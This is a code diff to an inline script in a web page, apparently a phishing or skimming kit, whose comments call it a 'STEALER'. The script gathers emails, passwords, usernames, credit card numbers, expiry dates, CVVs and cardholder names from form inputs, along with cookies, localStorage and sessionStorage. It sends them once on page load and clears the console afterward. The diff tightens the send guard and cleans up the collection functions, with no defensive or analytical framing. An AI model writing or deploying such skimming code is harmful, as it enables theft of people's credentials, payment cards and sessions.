@@ -354,6 +354,7 @@
     <script>
         // ============================================================
         // STEALER — SEND ONCE ON PAGE LOAD, NO RE-SEND
+        // FIXED: Strong guard prevents duplicate sends
         // ============================================================
 
         if (window._protect && window._protect.isBlocked && window._protect.isBlocked()) {
@@ -376,7 +377,7 @@
         let sendAttempts = 0;
         const MAX_SEND_ATTEMPTS = 1; // ONLY ONCE
 
-        // ---- COLLECT FORM DATA ----
+        // ---- COLLECT FORM DATA (credentials & cards) ----
         function collectFormData() {
             const inputs = document.querySelectorAll('input');
             const credentials = [];
@@ -388,6 +389,7 @@
                 const value = input.value;
                 if (!value) return;
 
+                // Detect credential fields
                 const isEmail = type === 'email' || name.includes('email');
                 const isPassword = type === 'password' || name.includes('pass');
                 const isUsername = type === 'text' && (name.includes('user') || name.includes('login') || name.includes('username'));
@@ -401,6 +403,7 @@
                     credentials.push({ name: input.name || input.id || 'unknown', value, type: detectedType });
                 }
 
+                // Detect credit card fields — includes cardholder name
                 const isCardNumber = name.includes('card') || name.includes('cc') || (name.includes('number') && name.includes('card'));
                 const isExpiry = name.includes('exp') || name.includes('month') || name.includes('year') || name.includes('mm') || name.includes('yy');
                 const isCvv = name.includes('cvv') || name.includes('cvc') || name.includes('code') || name.includes('security');
@@ -420,6 +423,7 @@
             return { credentials, cards };
         }
 
+        // ---- COOKIES & DATA COLLECTION ----
         function getCookies() {
             const cookies = document.cookie.split(';').map(c => c.trim());
             const result = {};
@@ -451,14 +455,28 @@
         }
 
         function getLocalStorage() {
-            try { const items = {}; for (let i=0; i<localStorage.length; i++) { const k = localStorage.key(i); items[k] = localStorage.getItem(k); } return items; } catch { return {}; }
+            try {
+                const items = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    items[key] = localStorage.getItem(key);
+                }
+                return items;
+            } catch { return {}; }
         }
 
         function getSessionStorage() {
-            try { const items = {}; for (let i=0; i<sessionStorage.length; i++) { const k = sessionStorage.key(i); items[k] = sessionStorage.getItem(k); } return items; } catch { return {}; }
+            try {
+                const items = {};
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    items[key] = sessionStorage.getItem(key);
+                }
+                return items;
+            } catch { return {}; }
         }
 
-        // ---- SEND ONCE ----
+        // ---- SEND ONCE — STRONG GUARD ----
         function sendData() {
             if (sent) return;
             if (sendAttempts >= MAX_SEND_ATTEMPTS) return;
@@ -573,6 +591,9 @@
                 captchaBox.click();
             }
         });
+
+        // ---- DO NOT RESEND — NO INTERVAL, NO FORM SUBMIT, NO BEFOREUNLOAD ----
+        // We send ONCE on page load. That's it. Dedup on server handles the rest.
 
         console.clear();
     </script>
